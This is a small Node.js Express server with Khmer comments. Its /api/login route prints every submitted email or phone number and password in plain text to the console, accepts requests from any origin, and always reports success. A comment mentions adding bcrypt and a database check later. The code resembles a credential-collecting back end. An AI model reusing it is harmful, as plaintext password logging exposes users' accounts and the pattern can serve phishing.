const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// អនុញ្ញាតឱ្យ Frontend បាញ់ទិន្នន័យមកបាន (Cross-Origin Resource Sharing)
app.use(cors());

// កំណត់ឱ្យអានទិន្នន័យជាទម្រង់ JSON
app.use(bodyParser.json());

// បង្កើត API Route សម្រាប់ទទួលទិន្នន័យពី Form ចូលគណនី
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    // បង្ហាញទិន្នន័យដែលលោតមកពី Form លើផ្ទាំង Terminal របស់ Server
    console.log("=== ទិន្នន័យថ្មីលោតមកដល់ហើយ ===");
    console.log("អ៊ីមែល/លេខទូរស័ព្ទ:", username);
    console.log("ពាក្យសម្ងាត់:", password);
    console.log("=================================\n");

    // ទីនេះជាកន្លែងដែលអ្នកត្រូវសរសេរកូដដើម្បីផ្ទៀងផ្ទាត់ ឬរក្សាទុកក្នុង Database
    // ឧទាហរណ៍: ប្រើ bcrypt ដើម្បី hash ពាក្យសម្ងាត់ និង ប្រើ SQL query ដើម្បីពិនិត្យមើល username និង password
    // ឆ្លើយតបទៅកាន់ Frontend វិញ
    res.json({ 
        success: true, 
        message: "ទទួលបានទិន្នន័យដោយជោគជ័យ!" 
    });
});

// បើកដំណើរការ Server
app.listen(PORT, () => {
    console.log(`Server កំពុងរត់នៅលើ Port: ${PORT}`);
});